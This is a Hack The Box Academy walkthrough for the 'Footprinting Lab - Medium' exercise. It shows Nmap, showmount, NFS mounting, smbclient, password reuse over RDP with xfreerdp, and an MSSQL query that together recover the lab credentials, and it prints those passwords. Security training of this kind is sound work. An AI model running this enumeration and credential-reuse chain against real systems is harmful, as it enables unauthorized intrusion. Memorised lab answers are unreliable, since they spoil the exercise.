
---

This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.

Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

---

# Footprinting Lab - Medium

## Question 1

### "Enumerate the server carefully and find the username "HTB" and its password. Then, submit his password as the answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
sudo nmap -A STMIP
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ sudo nmap -A 10.129.202.41

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-28 11:11 GMT
Nmap scan report for 10.129.202.41
Host is up (0.011s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-28T11:12:11+00:00
|_ssl-date: 2022-11-28T11:12:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2022-11-27T11:08:35
|_Not valid after:  2023-05-29T11:08:35

<SNIP>

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-28T11:12:13
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Students will notice that the NFS ports 111 and 2049 are open, therefore, they need to use `showmount` to list the available NFS shares on the spawned target:

Code: shell

```shell
showmount -e STMIP
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xx24xxdnig]─[~]
└──╼ [★]$ showmount -e 10.129.202.41

Export list for 10.129.202.41:
/TechSupport (everyone)
```

The only share that exists is `/TechSupport`, therefore, students need to mount it locally:

Code: shell

```shell
sudo mkdir NFS && sudo mount -t nfs STMIP:/TechSupport ./NFS
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ sudo mkdir NFS && sudo mount -t nfs 10.129.202.41:/TechSupport ./NFS
```

When viewing the data size of the files within the share, students will find out that all of them are empty except for "ticket4238791283782.txt":

Code: shell

```shell
sudo ls -lA NFS/
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ sudo ls -lA NFS/

total 4
-rwx------ 1 nobody 4294967294    0 Nov 10  2021 ticket4238791283649.txt
-rwx------ 1 nobody 4294967294    0 Nov 10  2021 ticket4238791283650.txt
-rwx------ 1 nobody 4294967294    0 Nov 10  2021 ticket4238791283651.txt
<SNIP>
-rwx------ 1 nobody 4294967294 1305 Nov 10  2021 ticket4238791283782.txt
<SNIP>
```

When viewing the contents of the file, students will attain the credentials `alex:lol123!mD`

Code: shell

```shell
sudo cat NFS/ticket4238791283782.txt
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ sudo cat NFS/ticket4238791283782.txt

Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
<SNIP>
```

Subsequently, students need to utilize the credentials `alex:lol123!mD` to list the shares as the user `alex`:

Code: shell

```shell
smbclient -L //STMIP -U alex
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ smbclient -L //10.129.202.41 -U alex

Enter WORKGROUP\alex's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	devshare        Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available
```

Students need to connect to `devshare`, to find the file "important.txt" which they need to `get`:

Code: shell

```shell
smbclient //STMIP/devshare -U alex
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ smbclient //10.129.202.41/devshare -U alex

Enter WORKGROUP\alex's password: 
Try "help" to get a list of possible commands.
smb: \> get important.txt 
getting file \important.txt of size 16 as important.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

Reading "important.txt", students will find what seems to be a Windows credentials `sa:87N1ns@slls83`:

Code: shell

```shell
awk 1 important.txt
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ awk 1 important.txt

sa:87N1ns@slls83
```

Therefore, students need to test for the security misconfiguration of password reuse and use the credentials `Administrator:87N1ns@slls83` to connect over RDP to the spawned target:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
```

  Footprinting Lab - Medium

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-tl1xuueppb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution

[13:18:01:895] [9814:9815] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

This may indicate that the certificate has been tampered with.
Please contact the administrator of the RDP server and clarify.
Do you trust the above certificate? (Y/T/N) Y
```

Once the RDP session has been established successfully, students need to open `Microsoft SQL Server Management Studio 18`:

![Footprinting_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/48/Footprinting_Walkthrough_Image_1.png)

![Footprinting_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/48/Footprinting_Walkthrough_Image_2.png)

After connecting to the SQL instance, students need to write a new query that retrieves all the columns from the `devsacc` table of the user `HTB`, finding the password `lnch7ehrdn43i7AoqVPK4zWR`:

Code: sql

```sql
SELECT * FROM devsacc WHERE name='HTB'
```

![Footprinting_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/48/Footprinting_Walkthrough_Image_3.png)

Answer: {hidden}